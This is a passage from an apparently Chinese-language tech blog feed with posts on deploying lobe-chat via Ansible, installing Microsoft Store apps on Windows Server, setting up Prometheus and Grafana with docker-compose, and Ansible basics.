class="hljs-attr">docker_image:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; docker_image &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">source:</span> <span class="hljs-string">pull</span><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">lobe-chat</span> <span class="hljs-string">container</span><br>      <span class="hljs-attr">docker_container:</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; container_name &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; docker_image &#125;&#125;</span>&quot;</span><br>        <span class="hljs-attr">state:</span> <span class="hljs-string">started</span><br>        <span class="hljs-attr">restart_policy:</span> <span class="hljs-string">always</span><br>        <span class="hljs-attr">ports:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123; host_port &#125;&#125;</span>:3210&quot;</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">OPENAI_API_KEY:</span> <span class="hljs-string">&quot;your_openai_api_key&quot;</span><br>          <span class="hljs-attr">GOOGLE_API_KEY:</span> <span class="hljs-string">&quot;your_google_api_key&quot;</span><br>          <span class="hljs-attr">DEEPSEEK_API_KEY:</span> <span class="hljs-string">&quot;your_deepseek_api_key&quot;</span><br>          <span class="hljs-attr">GROQ_API_KEY:</span> <span class="hljs-string">&quot;your_groq_api_key&quot;</span><br>          <span class="hljs-attr">ZEROONE_API_KEY:</span> <span class="hljs-string">&quot;your_zeroone_api_key&quot;</span><br>          <span class="hljs-attr">ACCESS_CODE:</span> <span class="hljs-string">&quot;your_access_code&quot;</span><br>      <span class="hljs-attr">when:</span> <span class="hljs-string">host_port</span> <span class="hljs-string">is</span> <span class="hljs-string">defined</span><br></code></pre></td></tr></table></figure><h3 id="Playbook-详解"><a href="#Playbook-详解" class="headerlink" title="Playbook 详解"></a>Playbook 详解</h3><ol><li><p><strong>主机组和权限</strong>：</p><ul><li><code>hosts: chatservers</code> 表示在 <code>chatservers</code> 组内的所有主机上运行任务。</li><li><code>become: yes</code> 让 Ansible 使用 sudo 权限。</li></ul></li><li><p><strong>变量定义</strong>：</p><ul><li><code>docker_image</code> 和 <code>container_name</code> 定义了 Docker 镜像名称和容器名称。</li><li><code>host_ports</code> 定义了每台主机对应的端口。</li></ul></li><li><p><strong>任务</strong>：</p><ul><li><strong>设置主机特定端口</strong>：通过 <code>with_items</code> 循环和 <code>when</code> 条件，根据主机名设置特定端口。</li><li><strong>停止运行中的 <code>lobe-chat</code> 容器</strong>：如果容器正在运行则停止它。</li><li><strong>移除现有的 <code>lobe-chat</code> 容器</strong>：如果容器存在则移除它。</li><li><strong>拉取最新的 <code>lobehub/lobe-chat</code> 镜像</strong>：从 Docker Hub 拉取最新的镜像。</li><li><strong>运行 <code>lobe-chat</code> 容器</strong>：运行容器，并根据特定主机的端口进行映射，同时设置环境变量。</li></ul></li></ol><h3 id="执行-Playbook"><a href="#执行-Playbook" class="headerlink" title="执行 Playbook"></a>执行 Playbook</h3><p>运行以下命令来执行 playbook：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ansible-playbook update_lobe_chat.yml<br></code></pre></td></tr></table></figure><p>这个命令会在 <code>chatservers</code> 组内的三台服务器（192.0.2.1、192.0.2.2 和 192.0.2.3）上执行任务，部署并运行 <code>lobe-chat</code> Docker 容器，端口分别映射为8080、8081和8082。</p><p>通过使用 Ansible可以轻松地在多台服务器上部署和管理 Docker 容器。使用变量和条件，可以根据不同的服务器配置特定的设置，使得部署更加灵活和高效。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用-Ansible-在多台服务器上部署-Docker-容器&quot;&gt;&lt;a href=&quot;#使用-Ansible-在多台服务器上部署-Docker-容器&quot; class=&quot;headerlink&quot; title=&quot;使用 Ansible 在多台服务器上部署 Docker 容器&quot;&gt;</summary>
      
    
    
    
    
    <category term="Ansible" scheme="http://example.com/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>windows server 安装Microsoft Store中的应用</title>
    <link href="http://example.com/2024/07/19/windows-server-%E5%AE%89%E8%A3%85Microsoft-Store%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>http://example.com/2024/07/19/windows-server-%E5%AE%89%E8%A3%85Microsoft-Store%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2024-07-18T17:05:12.000Z</published>
    <updated>2024-07-18T17:06:22.132Z</updated>
    
    <content type="html"><![CDATA[<h1 id="windows-server-安装Microsoft-Store中的应用"><a href="#windows-server-安装Microsoft-Store中的应用" class="headerlink" title="windows server 安装Microsoft Store中的应用"></a>windows server 安装Microsoft Store中的应用</h1><p>windows server没有Microsoft Store无法直接安装其中的应用，解决方法：获取应用的.msixbundle包并使用命令添加到电脑中。</p><h2 id="1-获取应用的msix包"><a href="#1-获取应用的msix包" class="headerlink" title="1.获取应用的msix包"></a>1.获取应用的msix包</h2><h3 id="获取应用的信息"><a href="#获取应用的信息" class="headerlink" title="获取应用的信息"></a>获取应用的信息</h3><p>（至于如何获取，可以试试Microsoft Store找找看，我是恰好在另外一台电脑上软件下载时候抓包得到的，应该有其他方法）</p><p>例如Microsoft 照片的PackageFamilyName为：Microsoft.Windows.Photos_8wekyb3d8bbwe</p><p>访问<a href="https://store.rg-adguard.net/%EF%BC%8C%E4%BD%BF%E7%94%A8">https://store.rg-adguard.net/，使用</a> PackageFamilyName 搜索应用：</p><p><img src="https://azure.wangsiyue.online:9001/blogimg/blogs/image-20240719002212174.png" alt="image-20240719002212174"></p><h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><p>下载搜索到的结果中的所有依赖和软件包（每种选择适合你电脑系统的一个就行）</p><p><img src="https://azure.wangsiyue.online:9001/blogimg/blogs/image-20240719002309518.png" alt="image-20240719002309518"></p><h2 id="2-安装依赖和程序包"><a href="#2-安装依赖和程序包" class="headerlink" title="2.安装依赖和程序包"></a>2.安装依赖和程序包</h2><p>将下载好的文件放在同一个目录下</p><p>打开power shell（管理员）使用<code>Add-AppxPackage *</code>安装所有包。</p><p><img src="https://azure.wangsiyue.online:9001/blogimg/blogs/image-20240719003211636.png" alt="image-20240719003211636"></p><h2 id="3-检查"><a href="#3-检查" class="headerlink" title="3.检查"></a>3.检查</h2><p>命令成功执行后没有什么反应，可以通过Windows的自带搜索找到刚刚安装好的软件。</p><p><img src="https://azure.wangsiyue.online:9001/blogimg/blogs/image-20240719003401515.png" alt="image-20240719003401515"></p><h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><p>1.依赖未正确安装，检查是否安装，版本是否正确</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">add-appxpackage .\Microsoft<span class="hljs-selector-class">.Windows</span><span class="hljs-selector-class">.Photos_2024</span>.<span class="hljs-number">11070.11002</span>.<span class="hljs-number">0</span>_neutral_~_8wekyb3d8bbwe<span class="hljs-selector-class">.Msixbundle</span><br>add-appxpackage : 部署失败，原因是 HRESULT: <span class="hljs-number">0</span>x80073CF3, 包无法进行更新、相关性或冲突验证。<br>Windows 无法安装程序包 Microsoft<span class="hljs-selector-class">.Windows</span><span class="hljs-selector-class">.Photos_2024</span>.<span class="hljs-number">11070.11002</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe，因为此程序包依赖于一个找不到的框<br>架。请随要安装的此程序包一起提供由“CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US”<br>发布的框架“Microsoft<span class="hljs-selector-class">.NET</span><span class="hljs-selector-class">.Native</span><span class="hljs-selector-class">.Framework</span>.<span class="hljs-number">2.2</span>”(具有中性或 x64 处理器体系结构，最低版本为 <span class="hljs-number">2.2</span>.<span class="hljs-number">29512.0</span>)。当前已安装的名<br>称为“Microsoft<span class="hljs-selector-class">.NET</span><span class="hljs-selector-class">.Native</span><span class="hljs-selector-class">.Framework</span>.<span class="hljs-number">2.2</span>”的框架为: &#123;&#125;<br>注意: 有关其他信息，请在事件日志中查找 <span class="hljs-selector-attr">[ActivityId]</span> <span class="hljs-number">7</span>f4cb46f-d489-<span class="hljs-number">0004</span>-<span class="hljs-number">45</span>e0-<span class="hljs-number">4</span>f7f89d4da01，或使用命令行 Get-AppPackageLo<br>g -ActivityID <span class="hljs-number">7</span>f4cb46f-d489-<span class="hljs-number">0004</span>-<span class="hljs-number">45</span>e0-<span class="hljs-number">4</span>f7f89d4da01<br>所在位置 行:<span class="hljs-number">1</span> 字符: <span class="hljs-number">1</span><br>+ add-appxpackage .\Microsoft<span class="hljs-selector-class">.Windows</span><span class="hljs-selector-class">.Photos_2024</span>.<span class="hljs-number">11070.11002</span>.<span class="hljs-number">0</span>_neutral ...<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : WriteError: (E:\Microsoft<span class="hljs-selector-class">.Wi</span>..<span class="hljs-selector-class">.bbwe</span><span class="hljs-selector-class">.Msixbundle</span>:String) <span class="hljs-selector-attr">[Add-AppxPackage]</span>, IOException<br>    + FullyQualifiedErrorId : DeploymentError,Microsoft<span class="hljs-selector-class">.Windows</span><span class="hljs-selector-class">.Appx</span><span class="hljs-selector-class">.PackageManager</span><span class="hljs-selector-class">.Commands</span>.AddAppxPackageCommand<br></code></pre></td></tr></table></figure><p>2.系统版本不兼容，换个稍微老一点的版本试试</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Add-AppxPackage .\Microsoft<span class="hljs-selector-class">.Windows</span><span class="hljs-selector-class">.Photos_2023</span>.<span class="hljs-number">10070.17002</span>.<span class="hljs-number">0</span>_neutral_~_8wekyb3d8bbwe<span class="hljs-selector-class">.AppxBundle</span><br>Add-AppxPackage : 部署失败，原因是 HRESULT: <span class="hljs-number">0</span>x80073D06, 无法安装此程序包，因为已安装该程序包的更高版本。<br>Windows 无法安装程序包 Microsoft<span class="hljs-selector-class">.Windows</span><span class="hljs-selector-class">.Photos_2023</span>.<span class="hljs-number">10070.17002</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe，因为它的版本为 <span class="hljs-number">2023.10070</span>.<span class="hljs-number">17002</span>.<br><span class="hljs-number">0</span>。已安装此程序包的更高版本 <span class="hljs-number">2024.11030</span>.<span class="hljs-number">22001.0</span>。<br>注意: 有关其他信息，请在事件日志中查找 <span class="hljs-selector-attr">[ActivityId]</span> <span class="hljs-number">7</span>f4cb46f-d489-<span class="hljs-number">0004</span>-a282-<span class="hljs-number">517</span>f89d4da01，或使用命令行 Get-AppPackageLo<br>g -ActivityID <span class="hljs-number">7</span>f4cb46f-d489-<span class="hljs-number">0004</span>-a282-<span class="hljs-number">517</span>f89d4da01<br>所在位置 行:<span class="hljs-number">1</span> 字符: <span class="hljs-number">1</span><br>+ Add-AppxPackage .\Microsoft<span class="hljs-selector-class">.Windows</span><span class="hljs-selector-class">.Photos_2023</span>.<span class="hljs-number">10070.17002</span>.<span class="hljs-number">0</span>_neutral ...<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : NotSpecified: (E:\photo\Micros..<span class="hljs-selector-class">.bbwe</span><span class="hljs-selector-class">.AppxBundle</span>:String) <span class="hljs-selector-attr">[Add-AppxPackage]</span>, Exception<br>    + FullyQualifiedErrorId : DeploymentError,Microsoft<span class="hljs-selector-class">.Windows</span><span class="hljs-selector-class">.Appx</span><span class="hljs-selector-class">.PackageManager</span><span class="hljs-selector-class">.Commands</span>.AddAppxPackageCommand<br></code></pre></td></tr></table></figure><p>参考：</p><blockquote><p><a href="https://blog.csdn.net/weixin_37826215/article/details/116781891">https://blog.csdn.net/weixin_37826215/article/details/116781891</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;windows-server-安装Microsoft-Store中的应用&quot;&gt;&lt;a href=&quot;#windows-server-安装Microsoft-Store中的应用&quot; class=&quot;headerlink&quot; title=&quot;windows server 安装Mic</summary>
      
    
    
    
    
    <category term="windows server" scheme="http://example.com/tags/windows-server/"/>
    
  </entry>
  
  <entry>
    <title>Prometheus 部署配置</title>
    <link href="http://example.com/2024/06/10/Prometheus-%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE/"/>
    <id>http://example.com/2024/06/10/Prometheus-%E9%83%A8%E7%BD%B2%E9%85%8D%E7%BD%AE/</id>
    <published>2024-06-10T05:46:53.000Z</published>
    <updated>2024-06-18T06:26:06.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Prometheus-Grafana"><a href="#Prometheus-Grafana" class="headerlink" title="Prometheus + Grafana"></a>Prometheus + Grafana</h1><p>基于docker-compose部署Prometheus + Grafana </p><h2 id="安装数据收集器-node-exporter"><a href="#安装数据收集器-node-exporter" class="headerlink" title="安装数据收集器 node-exporter"></a>安装数据收集器 node-exporter</h2><h3 id="安装-node-exporter"><a href="#安装-node-exporter" class="headerlink" title="安装 node-exporter"></a>安装 node-exporter</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> /opt<br><span class="hljs-attribute">sudo</span> wget https://github.com/prometheus/node_exporter/releases/download/v1.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>/node_exporter-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.linux-amd64.tar.gz<br><span class="hljs-attribute">sudo</span> tar zxf node_exporter-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.linux-amd64.tar.gz<br><span class="hljs-attribute">sudo</span> mv node_exporter-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.linux-amd64 node_exporter<br><span class="hljs-attribute">sudo</span> mv node_exporter /usr/local/<br></code></pre></td></tr></table></figure><p>运行如下命令测试 node-exporter 收集器启动情况，正常情况下会输出服务端口。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/node_exporter/</span>node_exporter<br></code></pre></td></tr></table></figure><h3 id="添加到系统服务"><a href="#添加到系统服务" class="headerlink" title="添加到系统服务"></a>添加到系统服务</h3><p>sudo vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;node_exporter.service<br>添加如下内容</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=mysqld_exporter<br><span class="hljs-attr">After</span>=network.target<br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">ExecStart</span>=/usr/local/node_exporter/node_exporter<br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure<br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><h3 id="加载并重启服务"><a href="#加载并重启服务" class="headerlink" title="加载并重启服务"></a>加载并重启服务</h3><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 加载配置</span><br>sudo <span class="hljs-params">system</span>ctl daemon-reload<br><span class="hljs-comment"># 启动服务</span><br>sudo <span class="hljs-params">system</span>ctl restart node_exporter.service<br><span class="hljs-comment"># 查看服务状态</span><br>sudo <span class="hljs-params">system</span>ctl status node_exporter.service<br><span class="hljs-comment"># 配置开机启动</span><br>sudo <span class="hljs-params">system</span>ctl enable node_exporter.service<br></code></pre></td></tr></table></figure><h3 id="查看数据收集情况"><a href="#查看数据收集情况" class="headerlink" title="查看数据收集情况"></a>查看数据收集情况</h3><p>重新起一个终端，查看数据收集情况。也可以在浏览器中查看。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">curl http:<span class="hljs-comment">//127.0.0.1:9100/metrics</span><br></code></pre></td></tr></table></figure><h2 id="docker-compse部署"><a href="#docker-compse部署" class="headerlink" title="docker-compse部署"></a>docker-compse部署</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>docker-compose.yml文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">prometheus:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/prometheus</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">prometheus</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9090:9090&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/prometheus:/etc/prometheus</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/prometheus_db:/prometheus</span><br>    <span class="hljs-attr">command:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--config.file=/etc/prometheus/prometheus.yml&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--storage.tsdb.path=/prometheus&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--web.console.libraries=/usr/share/prometheus/console_libraries&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;--web.console.templates=/usr/share/prometheus/consoles&#x27;</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">grafana:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">grafana/grafana</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">grafana</span><br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;53000:3000&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-comment">#- ./conf/grafana:/etc/grafana</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/grafana_data:/var/lib/grafana</span><br>    <span class="hljs-attr">depends_on:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">prometheus</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">pushgateway:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/pushgateway</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">pushgateway</span><br>    <br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9091:9091&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/pushgateway_data:/var/lib/pushgateway</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br>  <span class="hljs-attr">alertmanager:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">prom/alertmanager</span><br>    <span class="hljs-attr">hostname:</span> <span class="hljs-string">alertmanager</span><br>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">alertmanager</span><br>    <br>    <span class="hljs-attr">user:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;9093:9093&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./conf/alertmanager:/etc/alertmanager</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data/prometheus/alertmanager_data:/var/lib/alertmanager</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">net-prometheus</span><br><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">net-prometheus:</span><br><br></code></pre></td></tr></table></figure><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span><br></code></pre></td></tr></table></figure><h3 id="prometheus配置文件"><a href="#prometheus配置文件" class="headerlink" title="prometheus配置文件"></a>prometheus配置文件</h3><p>prometheus.yml文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-meta"># 全局配置</span><br><span class="hljs-symbol">global:</span><br>  <span class="hljs-meta"># 抓取间隔，每5秒抓取一次指标</span><br><span class="hljs-symbol">  scrape_interval:</span> <span class="hljs-number">5</span>s<br>  <span class="hljs-meta"># 评估规则的频率，每5秒评估一次</span><br><span class="hljs-symbol">  evaluation_interval:</span> <span class="hljs-number">5</span>s<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">  external_labels:</span><br><span class="hljs-symbol">    monitor:</span> <span class="hljs-string">&quot;dashboard&quot;</span><br><br><span class="hljs-meta"># 警报配置</span><br><span class="hljs-symbol">alerting:</span><br><span class="hljs-symbol">  alertmanagers:</span><br>    <span class="hljs-meta"># 定义 Alertmanager 实例</span><br>    - static_configs:<br>        - targets:<br>            - <span class="hljs-string">&quot;192.168.0.100:9093&quot;</span> <br><br><span class="hljs-meta"># 规则文件路径</span><br><span class="hljs-symbol">rule_files:</span><br>  - <span class="hljs-keyword">/etc/</span>prometheus<span class="hljs-keyword">/rules/</span>*.rules<br><br><span class="hljs-meta"># 采集配置</span><br><span class="hljs-symbol">scrape_configs:</span><br>  <span class="hljs-meta"># 采集 Prometheus 自身指标</span><br>  - job_name: <span class="hljs-string">&quot;prometheus&quot;</span><br><span class="hljs-symbol">    scrape_interval:</span> <span class="hljs-number">5</span>s<br><span class="hljs-symbol">    static_configs:</span><br>      - targets: [<span class="hljs-string">&quot;172.19.0.2:9090&quot;</span>] <span class="hljs-meta"># Prometheus 实例地址</span><br><br>  <span class="hljs-meta"># 采集 AWS 指标</span><br>  - job_name: <span class="hljs-string">&quot;server&quot;</span><br><span class="hljs-symbol">    static_configs:</span><br>      - targets: [<span class="hljs-string">&quot;server_IP_1:9100&quot;</span>]  <span class="hljs-meta"># 替换为实际的实例 IP</span><br></code></pre></td></tr></table></figure><p>参考文章：<br><a href="https://developer.aliyun.com/article/1158325">https://developer.aliyun.com/article/1158325</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Prometheus-Grafana&quot;&gt;&lt;a href=&quot;#Prometheus-Grafana&quot; class=&quot;headerlink&quot; title=&quot;Prometheus + Grafana&quot;&gt;&lt;/a&gt;Prometheus + Grafana&lt;/h1&gt;&lt;p&gt;基于</summary>
      
    
    
    
    
    <category term="服务器运维" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>Ansible 基础教程</title>
    <link href="http://example.com/2024/05/28/Ansible-%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <id>http://example.com/2024/05/28/Ansible-%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</id>
    <published>2024-05-28T05:34:46.000Z</published>
    <updated>2024-06-18T05:44:23.619Z</updated>
    
    <content type="html"><![CDATA[<p>Ansible 是一款 IT 自动化工具。主要应用场景有配置系统、软件部署、持续发布及不停服平滑滚动更新的高级任务编排。</p><p>Ansible 本身非常简单易用，同时注重安全和可靠性，以最小化变动为特色，使用 OpenSSH 实现数据传输 ( 如果有需要的话也可以使用其它传输模式或者 pull 模式 )，其语言设计非常利于人类阅读，即使是针对不刚接触 Ansible 的新手来讲亦是如此。</p><h1 id="Ansible安装配置"><a href="#Ansible安装配置" class="headerlink" title="Ansible安装配置"></a>Ansible安装配置</h1><h2 id="1-安装-Ansible"><a href="#1-安装-Ansible" class="headerlink" title="1. 安装 Ansible"></a>1. 安装 Ansible</h2><p><strong>apt 安装</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install software-properties-common</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-add-repository --<span class="hljs-built_in">yes</span> --update ppa:ansible/ansible</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install ansible</span><br></code></pre></td></tr></table></figure><p><strong>pip 安装</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo pip <span class="hljs-keyword">install</span> ansible<br></code></pre></td></tr></table></figure><h2 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2. 基本概念"></a>2. 